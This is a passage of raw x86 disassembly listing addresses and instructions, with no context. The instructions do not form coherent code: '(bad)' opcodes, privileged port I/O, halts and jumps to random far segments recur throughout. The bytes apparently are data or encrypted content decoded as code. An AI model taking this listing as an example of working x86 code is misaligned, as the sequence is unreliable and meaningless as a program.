  423c8d:	and    edx,DWORD PTR [edi+0x4d]
  423c90:	out    dx,al
  423c91:	mov    ds:0xc7ce211a,al
  423c96:	aam    0xa6
  423c98:	imul   eax,DWORD PTR ds:0xcb62a6f3,0xffffffce
  423c9f:	in     eax,0xc
  423ca1:	mov    edi,0x5c31dfa4
  423ca6:	test   eax,0xad8c11be
  423cab:	rol    BYTE PTR [ebp+0x35],cl
  423cae:	mov    ebx,DWORD PTR [eax+eax*1]
  423cb1:	outs   dx,BYTE PTR ds:[esi]
  423cb2:	dec    ecx
  423cb3:	scas   eax,DWORD PTR es:[edi]
  423cb4:	mov    al,ds:0x83724ae1
  423cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cbb:	retf   0xb832
  423cbe:	xlat   BYTE PTR ds:[ebx]
  423cbf:	inc    ecx
  423cc0:	xlat   BYTE PTR ds:[ebx]
  423cc1:	xacquire xchg BYTE PTR [eax],cl
  423cc4:	fistp  QWORD PTR [edx-0x6c5aefa5]
  423cca:	aam    0x6d
  423ccc:	xchg   ebp,eax
  423ccd:	call   0x252e3515
  423cd2:	in     al,dx
  423cd3:	ss jnp 0x423c7b
  423cd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cd7:	fmul   DWORD PTR [esi-0x2a5e1b5a]
  423cdd:	push   esi
  423cde:	je     0x423ccf
  423ce0:	test   eax,0x790927b8
  423ce5:	xchg   ebx,eax
  423ce6:	hlt    
  423ce7:	and    ah,cl
  423ce9:	xchg   DWORD PTR [esi-0x62f549ee],ebp
  423cef:	jb     0x423cc6
  423cf1:	push   0xffffffcb
  423cf3:	popf   
  423cf4:	cld    
  423cf5:	enter  0x1680,0x3b
  423cf9:	hlt    
  423cfa:	pop    es
  423cfb:	and    eax,0xdc234335
  423d00:	jg     0x423cee
  423d02:	stc    
  423d03:	imul   ebx,DWORD PTR cs:[ebx],0x13b81b1b
  423d0a:	push   0x74
  423d0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d0d:	mov    dh,0xb2
  423d0f:	mov    al,ds:0x6f906639
  423d14:	pushf  
  423d15:	int3   
  423d16:	ins    DWORD PTR es:[edi],dx
  423d17:	jg     0x423d93
  423d19:	and    esi,DWORD PTR [esi]
  423d1b:	addr16 jmp 0xc631:0xb60d0339
  423d23:	in     eax,dx
  423d24:	jns    0x423d32
  423d26:	xchg   edi,eax
  423d27:	mov    esi,DWORD PTR [edx+0x3b]
  423d2a:	mov    dh,0x7a
  423d2c:	xchg   ebx,eax
	...
  423d39:	add    al,bh
  423d3b:	mov    ah,0x7f
  423d3d:	cmp    eax,0xf5faff7f
  423d42:	mov    edx,0xe257ffb2
  423d47:	loop   0x423ccf
  423d49:	xchg   DWORD PTR [esi-0x4fffe4a],eax
  423d4f:	add    DWORD PTR [eax],eax
  423d51:	add    BYTE PTR [esi+esi*1+0x7f521c15],bl
  423d58:	xchg   edx,eax
  423d59:	add    BYTE PTR [ebp-0x64389b13],dh
  423d5f:	inc    esi
  423d60:	sub    edi,ebx
  423d62:	cmp    ch,0xb6
  423d65:	cli    
  423d66:	in     al,dx
  423d67:	lahf   
  423d68:	das    
  423d69:	jle    0x423d9d
  423d6b:	fidiv  DWORD PTR [edx]
  423d6d:	sbb    al,0xc3
  423d6f:	scas   al,BYTE PTR es:[edi]
  423d70:	dec    esi
  423d71:	pop    ss
  423d72:	adc    al,0x2b
  423d74:	mov    esp,DWORD PTR [esp+esi*4+0x3b]
  423d78:	pop    ecx
  423d79:	dec    ecx
  423d7a:	sbb    al,0x55
  423d7c:	add    dh,BYTE PTR ds:0x42297721
  423d82:	cvtdq2ps xmm0,XMMWORD PTR [esi+0x63bc1700]
  423d89:	in     al,dx
  423d8a:	lock mov WORD PTR [edi+ebx*4+0x5f],?
  423d8f:	mov    al,ds:0xc3fb1feb
  423d94:	dec    ecx
  423d95:	and    eax,0xb6ccbe48
  423d9a:	cmp    ch,BYTE PTR [bx+di+0x69]
  423d9e:	ins    DWORD PTR es:[edi],dx
  423d9f:	dec    ebx
  423da0:	sbb    DWORD PTR [ecx-0xc],ebx
  423da3:	mov    ds:0x38a7c3c0,al
  423da8:	sbb    DWORD PTR [ecx],ebp
  423daa:	daa    
  423dab:	sbb    al,cl
  423dad:	sub    ebp,edx
  423daf:	xor    BYTE PTR [ecx-0x7a72c052],al
  423db5:	mov    al,0xcd
  423db7:	jge    0x423e12
  423db9:	xchg   BYTE PTR [ebp-0x6a],ch
  423dbc:	iret   
  423dbd:	ss xchg BYTE PTR ds:[esi],bh
  423dc1:	cmp    ch,BYTE PTR [esp+ebp*8-0xc]
  423dc5:	repnz hlt 
  423dc7:	dec    eax
  423dc8:	mov    edi,0xeab349f0
  423dcd:	xchg   edx,eax
  423dce:	sub    ch,ch
  423dd0:	sahf   
  423dd1:	fucomip st,st(1)
  423dd3:	adc    BYTE PTR [edi+eiz*4],ch
  423dd6:	stos   DWORD PTR es:[edi],eax
  423dd7:	ja     0x423df1
  423dd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dda:	xor    BYTE PTR [ecx],bh
  423ddc:	mov    eax,0xb0807a20
  423de1:	sub    DWORD PTR [ebp-0x4d],0x71
  423de5:	push   cs
  423de6:	mov    eax,0xbc4dc2e9
  423deb:	out    0x17,eax
  423ded:	sub    DWORD PTR [edi+0x10],eax
  423df0:	js     0x423e51
  423df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423df3:	aad    0xb3
  423df5:	xchg   edx,eax
  423df6:	iret   
  423df7:	adc    al,0x71
  423df9:	mov    eax,DWORD PTR [ebx-0x72]
  423dfc:	mov    ah,0x93
  423dfe:	(bad)  
  423dff:	mov    ebx,0x33459f65
  423e04:	and    cl,BYTE PTR [eax+0x7ee95259]
  423e0a:	js     0x423e29
  423e0c:	cmp    dh,BYTE PTR [edi*8-0x3b66fdb4]
  423e13:	lods   eax,DWORD PTR ds:[esi]
  423e14:	cdq    
  423e15:	push   ds
  423e16:	adc    al,0xa0
  423e18:	outs   dx,DWORD PTR ds:[esi]
  423e19:	mov    edx,0xd2e31b5
  423e1e:	iret   
  423e1f:	mov    al,ch
  423e21:	out    dx,al
  423e22:	jmp    0x1a6c:0xccc042b
  423e29:	inc    edi
  423e2a:	or     dl,BYTE PTR [edx-0x78]
  423e2d:	jmp    0x423e90
  423e2f:	das    
  423e30:	test   cl,dl
  423e32:	rol    dh,0x53
  423e35:	out    0xaa,al
  423e37:	xchg   ebp,eax
  423e38:	pop    es
  423e39:	pop    ds
  423e3a:	dec    eax
  423e3b:	jns    0x423e89
  423e3d:	mov    bl,0xa0
  423e3f:	fst    QWORD PTR [eax-0x1101acd]
  423e45:	push   edx
  423e46:	dec    ebp
  423e47:	sti    
  423e48:	mov    ch,0x8f
  423e4a:	dec    esi
  423e4b:	jmp    0xda74537e
  423e50:	jmp    0xfc70:0x112e30bd
  423e57:	push   ss
  423e58:	sbb    al,0x79
  423e5a:	mov    al,ds:0x13838bdb
  423e5f:	les    edx,FWORD PTR [ebp-0x65]
  423e62:	mov    ebx,DWORD PTR fs:[edx]
  423e65:	mov    al,0x88
  423e67:	and    bl,BYTE PTR [edx-0x4a]
  423e6a:	cs mov ebx,0xb9dded0c
  423e70:	jmp    0x55b:0xd2511e07
  423e77:	idiv   DWORD PTR ds:0x2b456873
  423e7d:	cwde   
  423e7e:	jl     0x423ebe
  423e80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e81:	mov    esp,0xc2680ea6
  423e86:	sbb    eax,0x8ed37e96
  423e8b:	pop    edi
  423e8c:	jo     0x423e58
  423e8e:	mov    DWORD PTR [esi+edx*2],eax
  423e91:	xchg   ebp,eax
  423e92:	pop    ds
  423e93:	mov    bh,BYTE PTR ds:[ebp+0x40e0fd9]
  423e9a:	clc    
  423e9b:	lock inc ebx
  423e9d:	popa   
  423e9e:	xchg   ebx,eax
  423e9f:	xchg   edi,eax
  423ea0:	out    dx,al
  423ea1:	shl    esp,0xfc
  423ea4:	idiv   edi
  423ea6:	popa   
  423ea7:	sar    DWORD PTR [eax+0x18],cl
  423eaa:	repz add bh,dl
  423ead:	sahf   
  423eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423eaf:	lods   eax,DWORD PTR ds:[esi]
  423eb0:	or     dl,BYTE PTR [edi-0x590e5d94]
  423eb6:	jns    0x423f11
  423eb8:	rol    DWORD PTR [esi-0x42],1
  423ebb:	(bad)  
  423ebc:	jmp    0x7aa154f0
  423ec1:	sahf   
  423ec2:	mov    al,ds:0x72acae4e
  423ec7:	jne    0x423f2c
  423ec9:	fnstcw WORD PTR [ebx+0x71]
  423ecc:	cld    
  423ecd:	push   cs
  423ece:	in     eax,dx
  423ecf:	sub    DWORD PTR [ecx+0x159d8cf3],ecx
  423ed5:	xchg   edx,eax
  423ed6:	pop    esp
  423ed7:	mov    ecx,0x71a4bd65
  423edc:	xor    dl,ch
  423ede:	lock mov ebp,0x1efef2ca
  423ee4:	mov    edi,0x6b63c627
  423ee9:	push   edi
  423eea:	(bad)  
  423eeb:	jo     0x423f6b
  423eed:	out    0x4a,al
  423eef:	fs aad 0xd
  423ef2:	push   0x92e19529
  423ef7:	lea    ecx,[esi+0x6d]
  423efa:	dec    ebx
  423efb:	fistp  WORD PTR [edi-0x7a]
  423efe:	pop    es
  423eff:	scas   eax,DWORD PTR es:[edi]
  423f00:	in     al,dx
  423f01:	mov    ebx,0x4e26b7f8
  423f06:	sbb    BYTE PTR [ebx+edi*1+0x22e440f],ah
  423f0d:	fnstcw WORD PTR [edx]
  423f0f:	(bad)  
  423f10:	xchg   edx,eax
  423f11:	fsubr  QWORD PTR [edi]
  423f13:	mov    ds:0xea4aa913,al
  423f18:	add    eax,0x16911709
  423f1d:	(bad)  
  423f1e:	pop    eax
  423f1f:	jo     0x423ec6
  423f21:	pop    ebx
  423f22:	mov    ds:0x1ce87505,al
  423f27:	imul   edx,DWORD PTR [ebx+ecx*1],0x4a
  423f2b:	sbb    edi,0xffffffa9
  423f2e:	xchg   ebx,eax
  423f2f:	cs and al,0x65
  423f32:	push   0x929f5aee
  423f37:	mov    eax,ds:0xde22c2d7
  423f3c:	js     0x423f05
  423f3e:	add    edx,0xffffffbf
  423f41:	push   0xffffff85
  423f43:	ror    DWORD PTR [ecx+0x645cdce],1
  423f49:	in     eax,dx
  423f4a:	xor    eax,0x6382
	...
  423f57:	add    BYTE PTR [eax],al
  423f59:	add    BYTE PTR [ecx],bh
  423f5b:	sbb    al,0x89
  423f5d:	out    0xad,eax
  423f5f:	idiv   DWORD PTR [edi-0x22]
  423f62:	test   eax,0x2de902b9
  423f67:	pop    DWORD PTR [edx+0x1b88102]
  423f6d:	add    bl,bh
  423f6f:	add    DWORD PTR [eax],eax
  423f71:	add    BYTE PTR [edx],bl
  423f73:	mov    edx,0x266c9fb7
  423f78:	outs   dx,BYTE PTR ds:[esi]
  423f79:	xor    DWORD PTR [edx+0x334c70ef],ebp
  423f7f:	sbb    al,0xa7
  423f81:	push   ds
  423f82:	(bad)  [edx+0x3f]
  423f85:	sub    BYTE PTR [edi-0x3913bd82],0xad
  423f8c:	or     al,0xaa
  423f8e:	and    al,cl
  423f90:	pop    es
  423f91:	cmp    al,0x1c
  423f93:	sub    al,0x24
  423f95:	dec    esp
  423f96:	dec    ecx
  423f97:	xor    BYTE PTR [ebx],dl
  423f99:	(bad)  
  423f9a:	mov    esi,0x616c3c1b
  423f9f:	daa    
  423fa0:	jmp    0x423fa8
  423fa2:	sub    ah,BYTE PTR [eax]
  423fa4:	enter  0x585e,0x47
  423fa8:	fidiv  DWORD PTR [esi+0x58]
  423fab:	pop    es
  423fac:	jp     0x423fff
  423fae:	sub    edx,DWORD PTR [ebx+0xc454ef5]
  423fb4:	inc    ebx
  423fb5:	add    BYTE PTR [ebx+0xedfdd24],ch
  423fbb:	fwait
  423fbc:	in     al,0x7e
  423fbe:	sbb    ebx,edx
  423fc0:	(bad)  
  423fc1:	adc    eax,0x9953ecf7
  423fc6:	dec    edx
  423fc7:	cmp    edi,DWORD PTR [edi-0x2b]
  423fca:	dec    ecx
  423fcb:	in     al,0x32
  423fcd:	fimul  WORD PTR [edx+0x63]
  423fd0:	mov    edx,0xe832a01e
  423fd5:	fld    DWORD PTR [edi]
  423fd7:	mov    ebp,0x2b9eede8
  423fdc:	hlt    
  423fdd:	lods   eax,DWORD PTR ds:[esi]
  423fde:	push   cs
  423fdf:	je     0x423fc7
  423fe1:	jmp    0xc13f:0xb3c90258
  423fe8:	addr16 and al,0x8a
  423feb:	mov    esi,0xf778162d
  423ff0:	add    al,0x94
  423ff2:	jle    0x423ffb
  423ff4:	push   cs
  423ff5:	pop    eax
  423ff6:	xor    eax,0xaa4d6729
  423ffb:	sbb    al,0xe9
  423ffd:	pusha  
  423ffe:	hlt    
  423fff:	in     eax,dx
  424000:	stos   DWORD PTR es:[edi],eax
  424001:	mov    eax,0x6cb9eff6
  424006:	inc    edx
  424007:	dec    esp
  424008:	les    edx,FWORD PTR [edi+0x59908189]
  42400e:	cmp    ecx,DWORD PTR [ebx+0x62]
  424011:	cs pop esi
  424013:	and    al,bh
  424015:	stos   DWORD PTR es:[edi],eax
  424016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424017:	mov    bl,0x8e
  424019:	mov    cs,WORD PTR [eax-0x29457801]
  42401f:	mov    dh,0xab
  424021:	aam    0xd
  424023:	daa    
  424024:	cmp    al,0x26
  424026:	lods   eax,DWORD PTR ds:[esi]
  424027:	popa   
  424028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424029:	lods   eax,DWORD PTR ds:[esi]
  42402a:	jnp    0x424018
  42402c:	dec    edx
  42402d:	cwde   
  42402e:	add    ebp,DWORD PTR [ecx+0x1b]
  424031:	popa   
  424032:	mov    esp,esp
  424034:	lods   al,BYTE PTR ds:[esi]
  424035:	ins    BYTE PTR es:[edi],dx
  424036:	gs jle 0x4240a1
  424039:	inc    ecx
  42403a:	call   0xfee4:0x3d3a6dce
  424041:	loope  0x423fe7
  424043:	out    0x9f,eax
  424045:	xchg   ebx,eax
  424046:	dec    esp
  424047:	test   BYTE PTR [eax+0x27c0e7f1],0xc6
  42404e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42404f:	dec    esp
  424050:	fsubr  st(4),st
  424052:	aam    0xc3
  424054:	xchg   edx,eax
  424055:	sub    al,0x44
  424057:	loopne 0x42402f
  424059:	pop    eax
  42405a:	xchg   ebx,eax
  42405b:	ins    BYTE PTR es:[edi],dx
  42405c:	pop    edi
  42405d:	fdivr  DWORD PTR [ecx+0x4c]
  424060:	add    al,0xc3
  424062:	test   al,0xf9
  424064:	fwait
  424065:	leave  
  424066:	sbb    ch,BYTE PTR [ebp-0x1e]
  424069:	and    DWORD PTR [ebx+0x5c],edi
  42406c:	(bad)  
  42406d:	and    al,0x77
  42406f:	(bad)  
  424070:	mov    al,0x9b
  424072:	aam    0xf3
  424074:	cmp    BYTE PTR [ebp+edi*8-0x5e],0x79
  424079:	fnsetpm(287 only) 
  42407b:	ret    0x180f
  42407e:	or     eax,0x915549d7
  424083:	pop    eax
  424084:	out    dx,al
  424085:	mov    WORD PTR [ebx],es
  424087:	addr16 adc eax,0x832ac408
  42408d:	jmp    0xd656b1f3
  424092:	dec    ebp
  424093:	test   al,0xe2
  424095:	aam    0xe2
  424097:	iret   
  424098:	jecxz  0x424060
  42409a:	scas   eax,DWORD PTR es:[edi]
  42409b:	outs   dx,DWORD PTR ds:[esi]
  42409c:	sub    dl,bh
  42409e:	iret   
  42409f:	mov    ebx,0xff48a04e
  4240a4:	and    DWORD PTR [eax+0x1f],0x47
  4240a8:	dec    edx
  4240a9:	fmul   st,st(5)
  4240ab:	lods   eax,DWORD PTR ds:[esi]
  4240ac:	xchg   DWORD PTR [ebx],esi
  4240ae:	push   ecx
  4240af:	fadd   DWORD PTR [esi]
  4240b1:	pusha  
  4240b2:	(bad)  
  4240b3:	xor    al,0x7b
  4240b5:	lds    ebp,FWORD PTR ds:0x8ef0eb21
  4240bb:	aaa    
  4240bc:	mov    ds:0x85971759,al
  4240c1:	jns    0x424049
  4240c3:	mov    ds:0x30940d0f,al
  4240c8:	lahf   
  4240c9:	push   esi
  4240ca:	mov    ss,esp
  4240cc:	cmc    
  4240cd:	push   esi
  4240ce:	jmp    0x42406c
  4240d0:	pop    ds
  4240d1:	sahf   
  4240d2:	mov    dh,0x86
  4240d4:	pop    edx
  4240d5:	xlat   BYTE PTR ds:[ebx]
  4240d6:	dec    edx
  4240d7:	mov    al,ds:0x4288f811
  4240dc:	fwait
  4240dd:	and    al,0x38
  4240df:	jmp    0x4240d1
  4240e1:	out    0x12,al
  4240e3:	(bad)  
  4240e4:	leave  
  4240e5:	and    eax,0xd8370e5b
  4240ea:	pop    ebx
  4240eb:	out    dx,eax
  4240ec:	neg    DWORD PTR [ebx]
  4240ee:	test   eax,0x92628911
  4240f3:	dec    ecx
  4240f4:	xor    al,BYTE PTR [esi]
  4240f6:	sbb    ah,BYTE PTR [ebp-0x5333d5e]
  4240fc:	inc    edx
  4240fd:	or     DWORD PTR [ebp+0x68],ebp
  424100:	xlat   BYTE PTR ds:[ebx]
  424101:	pop    esi
  424102:	addr16 jne 0x424160
  424105:	sti    
  424106:	xor    DWORD PTR [ebx-0x66],ecx
  424109:	xor    edi,edx
  42410b:	pop    edx
  42410c:	js     0x4240f7
  42410e:	mov    dl,0xb0
  424110:	push   0x54
  424112:	adc    DWORD PTR [esi-0x73],esi
  424115:	mov    esi,0x74da86ad
  42411a:	adc    ecx,DWORD PTR [edx-0x5d]
  42411d:	sbb    al,BYTE PTR [esi+0x2e]
  424120:	test   DWORD PTR [ebx],edx
  424122:	int    0x72
  424124:	and    eax,DWORD PTR gs:[edi]
  424127:	xor    al,0x92
  424129:	xchg   ecx,eax
  42412a:	sbb    BYTE PTR [ebx+0x59dcd1bc],bh
  424130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424131:	jae    0x424174
  424133:	in     al,dx
  424134:	fimul  WORD PTR [esp+esi*8]
  424137:	dec    ecx
  424138:	cmp    al,0xe1
  42413a:	(bad)  
  42413b:	repnz adc eax,0x9b352964
  424141:	test   DWORD PTR [ecx+0x120d12a4],ebx
  424147:	repz push ecx
  424149:	mov    edx,0xe19039d4
  42414e:	push   esp
  42414f:	xchg   esi,eax
  424150:	frstor [ebx-0x65]
  424153:	mov    dl,0xf6
  424155:	lds    edx,FWORD PTR [edx+0x5bff24e1]
  42415b:	adc    edx,DWORD PTR [edi+0xdd88b9f]
  424161:	sahf   
  424162:	retf   
  424163:	push   ds
  424164:	pop    ebp
  424165:	push   ds
  424166:	cmp    dh,BYTE PTR [esi+0x49]
  424169:	aam    0xf1
  42416b:	retf   
  42416c:	sbb    al,BYTE PTR [eax]
	...
  42417a:	gs mov ah,0x18
  42417d:	fcompp 
  42417f:	(bad)  
  424180:	out    0xbf,eax
  424182:	fs dec edi
  424184:	popf   
  424185:	outs   dx,BYTE PTR ds:[esi]
  424186:	push   es
  424187:	scas   eax,DWORD PTR es:[edi]
  424188:	cmp    bh,bl
  42418a:	jl     0x424146
  42418c:	add    DWORD PTR [eax],eax
  42418e:	sti    
  42418f:	add    DWORD PTR [eax],eax
  424191:	add    BYTE PTR [edi],bh
  424193:	fst    QWORD PTR [edx]
  424195:	shr    edi,0xf9
  424198:	mov    ah,0x76
  42419a:	(bad)  
  42419b:	sub    ebx,DWORD PTR [edx]
  42419d:	cmp    ah,BYTE PTR [edx]
  42419f:	pop    ds
  4241a0:	cmp    DWORD PTR [ebx+0x638a31b4],ebp
  4241a6:	sar    DWORD PTR [esi+0x405f654a],1
  4241ac:	mov    dh,0x46
  4241ae:	dec    ebp
  4241af:	aad    0x9a
  4241b1:	add    BYTE PTR [ecx-0x6d812458],ch
  4241b7:	jg     0x4241fc
  4241b9:	je     0x424189
  4241bb:	push   ss
  4241bc:	int3   
  4241bd:	ret    
  4241be:	mov    ds:0x872f7f5f,eax
  4241c3:	or     DWORD PTR [esi],edx
  4241c5:	mov    cl,0x24
  4241c7:	mov    edx,0x84a95b2d
  4241cc:	arpl   WORD PTR [ecx],si
  4241ce:	fisttp DWORD PTR [eax-0xe8149ef]
  4241d4:	stos   DWORD PTR es:[edi],eax
  4241d5:	mov    ds:0x3085d9ec,eax
  4241da:	icebp  
  4241db:	out    0xe9,eax
  4241dd:	jl     0x4241a3
  4241df:	xchg   esi,eax
  4241e0:	into   
  4241e1:	mov    eax,ds:0x2986c66d
  4241e6:	test   eax,0x39a8c7a0
  4241eb:	nop
  4241ec:	rcl    BYTE PTR [eax],0xe4
  4241ef:	cwde   
  4241f0:	test   BYTE PTR [edx-0x5dfecd07],dl
  4241f6:	sub    edx,DWORD PTR [edx+0x96194b0]
  4241fc:	mov    edi,0xcaafccc8
  424201:	add    BYTE PTR [ecx+edx*1],al
  424204:	out    dx,eax
  424205:	mov    esp,DWORD PTR [esi]
  424207:	int    0x14
  424209:	jne    0x4241bf
  42420b:	test   al,0x82
  42420d:	retf   
  42420e:	push   ebx
  42420f:	cmp    eax,0x712f2444
  424214:	jb     0x4241c6
  424216:	cmp    BYTE PTR [ecx+0x2c31494e],0x14
  42421d:	inc    BYTE PTR [ecx+0x7e]
  424220:	test   al,0xf3
  424222:	cmc    
  424223:	add    al,0x87
  424225:	fs cdq 
  424227:	test   DWORD PTR [ecx-0x38466c64],0xe4b7a1fe
  424231:	or     ch,bh
  424233:	inc    esi
  424234:	addr16 or al,ch
  424237:	jge    0x42425e
  424239:	adc    edi,DWORD PTR [esi+0x54]
  42423c:	pushf  
  42423d:	imul   edi,DWORD PTR [esp+ebx*2],0xffffffcd
  424241:	push   esp
  424242:	push   ss
  424243:	xchg   ebp,ecx
  424245:	das    
  424246:	jnp    0x4242a6
  424248:	pop    es
  424249:	dec    edx
  42424a:	push   ebx
  42424b:	mov    ch,0xd4
  42424d:	xchg   ebx,eax
  42424e:	pusha  
  42424f:	jl     0x4242a7
  424251:	mov    eax,ds:0xb3458294
  424256:	adc    edx,edi
  424258:	and    DWORD PTR [ebp-0x52da4908],ebp
  42425e:	int3   
  42425f:	arpl   WORD PTR [ebp+0x39],bx
  424262:	jns    0x4242c3
  424264:	add    BYTE PTR [ecx-0xb6368f8],0x5e
  42426b:	adc    BYTE PTR [si+0x6b6b],0x18
  424271:	cmp    dh,BYTE PTR [ebp-0x18]
  424274:	idiv   BYTE PTR [esp+eax*1+0x3b9b4ed9]
  42427b:	pop    eax
  42427c:	mov    edi,0xc1f9b9ae
  424281:	cli    
  424282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424283:	rcr    DWORD PTR [esi],0xfc
  424286:	enter  0xdad,0x7
  42428a:	cmp    eax,0x1013f1c1
  42428f:	repnz xor cl,BYTE PTR cs:[edx]
  424293:	xor    DWORD PTR [eax+0x73],ebx
  424296:	mov    cl,0xa7
  424298:	test   eax,0x693d57ce
  42429d:	push   esi
  42429e:	push   ebx
  42429f:	jmp    0x424308
  4242a1:	jmp    0x424321
  4242a3:	jno    0x424231
  4242a5:	push   edi
  4242a6:	pop    ecx
  4242a7:	mov    WORD PTR [eax-0x7dd36019],gs
  4242ad:	adc    BYTE PTR [ebx-0x4a],bl
  4242b0:	push   0x7808983a
  4242b5:	push   cs
  4242b6:	or     ch,ch
  4242b8:	ror    eax,1
  4242ba:	push   ds
  4242bb:	xchg   ecx,eax
  4242bc:	add    al,0xb4
  4242be:	jnp    0x42432e
  4242c0:	cwde   
  4242c1:	push   es
  4242c2:	outs   dx,BYTE PTR ds:[esi]
  4242c3:	push   0x61
  4242c5:	mov    ecx,ebx
  4242c7:	nop
  4242c8:	jnp    0x4242dc
  4242ca:	icebp  
  4242cb:	push   es
  4242cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242cd:	sbb    edx,ebp
  4242cf:	cmp    eax,DWORD PTR [esi]
  4242d1:	mov    ebp,0x71a5be5c
  4242d6:	adc    al,0x4c
  4242d8:	pop    ebx
  4242d9:	and    BYTE PTR [ecx+0x6c],al
  4242dc:	and    DWORD PTR [edi+0x15892737],edi
  4242e2:	push   edi
  4242e3:	sbb    DWORD PTR [ecx],ebp
  4242e5:	or     DWORD PTR [edx],esp
  4242e7:	rcl    DWORD PTR [esi-0x420e24d4],1
  4242ed:	inc    ecx
  4242ee:	inc    edx
  4242ef:	or     DWORD PTR [ecx-0x72],edi
  4242f2:	mov    ebx,0x99074648
  4242f7:	ja     0x4242c7
  4242f9:	fisttp QWORD PTR [ecx]
  4242fb:	push   cs
  4242fc:	pop    edx
  4242fd:	sub    eax,0xe7a819a8
  424302:	push   ebx
  424303:	je     0x4242e8
  424305:	popf   
  424306:	aaa    
  424307:	mov    edx,ss
  424309:	cwde   
  42430a:	ret    0xfe41
  42430d:	je     0x4242b4
  42430f:	dec    ebp
  424310:	in     eax,0x83
  424312:	fisub  WORD PTR [ebp+0x44]
  424315:	mov    bl,0x9
  424317:	or     al,0x2e
  424319:	cmp    edi,DWORD PTR [esi]
  42431b:	fdivr  DWORD PTR [ebx]
  42431d:	jle    0x42437d
  42431f:	call   0xc678a466
  424324:	jp     0x4242d4
  424326:	mov    al,ds:0xf167cefd
  42432b:	in     eax,0xa2
  42432d:	pusha  
  42432e:	pop    edi
  42432f:	dec    eax
  424330:	int    0xad
  424332:	xor    ebx,DWORD PTR [edx]
  424334:	sbb    bl,BYTE PTR [edi+ebx*1-0x5f]
  424338:	push   0xffffffe8
  42433a:	mov    cl,BYTE PTR [eax+0x4a]
  42433d:	out    0x97,al
  42433f:	sbb    DWORD PTR [ecx+0x44],edi
  424342:	daa    
  424343:	cmp    BYTE PTR [ecx+0x5b],ch
  424346:	leave  
  424347:	cmp    eax,0x323b8ac
  42434c:	mov    ah,0xc4
  42434e:	xlat   BYTE PTR ds:[ebx]
  42434f:	mov    ah,0x6
  424351:	cmp    eax,0xe73ffb7d
  424356:	fmul   DWORD PTR [edi]
  424358:	leave  
  424359:	jns    0x424375
  42435b:	jmp    0xa288f8a2
  424360:	xor    BYTE PTR [ebp-0x35fca39a],bl
  424366:	mov    al,ds:0x5dd55fd
  42436b:	jae    0x4243cf
  42436d:	mov    al,0xcf
  42436f:	adc    BYTE PTR [ecx],bh
  424371:	lea    esp,[ebx-0x30d20fd8]
  424377:	jmp    0xd951:0x47ebbee1
  42437e:	fs aam 0x49
  424381:	loopne 0x424335
  424383:	push   edx
  424384:	outs   dx,DWORD PTR ds:[esi]
  424385:	cmp    BYTE PTR [edx-0x72],dl
  424388:	cmp    dl,bh
  42438a:	adc    BYTE PTR [edi+0x62],0x0
	...
  42439a:	adc    bl,al
  42439c:	arpl   WORD PTR [edx-0x15],si
  42439f:	sti    
  4243a0:	adc    edi,eax
  4243a2:	jl     0x424328
  4243a4:	dec    edi
  4243a5:	dec    esp
  4243a6:	lods   al,BYTE PTR ds:[esi]
  4243a7:	cwde   
  4243a8:	dec    edx
  4243a9:	aad    0x77
  4243ab:	mov    esp,0x1fb0001
  4243b0:	add    BYTE PTR [eax],al
  4243b2:	(bad)  
  4243b3:	(bad)  
  4243b4:	ds aad 0xeb
  4243b7:	dec    DWORD PTR [eax-0x7b4f785c]
  4243bd:	ins    DWORD PTR es:[edi],dx
  4243be:	jl     0x424414
  4243c0:	and    al,0xaa
  4243c2:	mov    bl,0xa6
  4243c4:	enter  0x204f,0x27
  4243c8:	dec    esp
  4243c9:	imul   ecx,DWORD PTR [ebx-0x63],0x3335980c
  4243d0:	sub    esp,eax
  4243d2:	add    BYTE PTR [eax+ebp*4],dh
  4243d5:	retf   
  4243d6:	jnp    0x4243df
  4243d8:	mov    ch,0x9f
  4243da:	aas    
  4243db:	clc    
  4243dc:	lock dec ebp
  4243de:	fsub   DWORD PTR es:0x1956b0e2
  4243e5:	test   al,0xfb
  4243e7:	xor    dh,BYTE PTR [ebx]
  4243e9:	jge    0x424453
  4243eb:	pop    esp
  4243ec:	or     cl,BYTE PTR [ebx]
  4243ee:	cmp    DWORD PTR [esi],eax
  4243f0:	mov    edx,0xd1e90f97
  4243f5:	das    
  4243f6:	sbb    eax,0xde165b5
  4243fb:	push   ds
  4243fc:	imul   eax,DWORD PTR [edi+0x40256cad],0x56
  424403:	fmul   QWORD PTR [ebx-0x50]
  424406:	stos   DWORD PTR es:[edi],eax
  424407:	cmp    eax,0xe7d533ab
  42440c:	xchg   ebx,eax
  42440d:	adc    BYTE PTR [ebx+0x1962db77],bl
  424413:	sub    esp,DWORD PTR [edx]
  424415:	fs jns 0x424459
  424418:	fild   QWORD PTR [edi+esi*2]
  42441b:	jecxz  0x424437
  42441d:	push   cs
  42441e:	loop   0x424495
  424420:	dec    ebp
  424421:	scas   al,BYTE PTR es:[edi]
  424422:	inc    eax
  424423:	repz add DWORD PTR [eax+0x394e80c7],0x6a2b2ec6
  42442e:	mov    esp,0x40dc0d7
  424433:	sti    
  424434:	test   al,0x7
  424436:	xchg   ebp,ebp
  424438:	or     al,0xde
  42443a:	sbb    ebx,edx
  42443c:	lahf   
  42443d:	test   DWORD PTR ds:0xa22684af,ebp
  424443:	cmp    ch,dl
  424445:	jno    0x42447c
  424447:	push   ecx
  424448:	adc    esp,esp
  42444a:	scas   eax,DWORD PTR es:[edi]
  42444b:	(bad)  
  42444c:	jecxz  0x42445d
  42444e:	and    al,0xa3
  424450:	pop    ebx
  424451:	in     al,0x9e
  424453:	jle    0x4244bb
  424455:	test   eax,0x46e20007
  42445a:	push   ds
  42445b:	das    
